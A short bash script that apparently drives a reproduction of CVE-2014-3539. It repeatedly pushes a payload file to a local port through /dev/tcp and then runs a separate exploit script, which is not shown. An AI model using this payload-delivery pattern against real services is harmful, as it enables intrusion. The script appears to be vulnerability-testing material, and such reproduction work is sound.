#!/bin/bash
export PYTHONPATH=$(readlink -f ../..):$PYTHONPATH
trap "killall -- $(basename $0)" EXIT

(while : ; do
    ( cat payload.txt > /dev/tcp/0.0.0.0/3037; ) &>/dev/null \
        && echo -n "SUCCESS: "
done)&

python CVE-2014-3539.py 2>/dev/null
exit $?
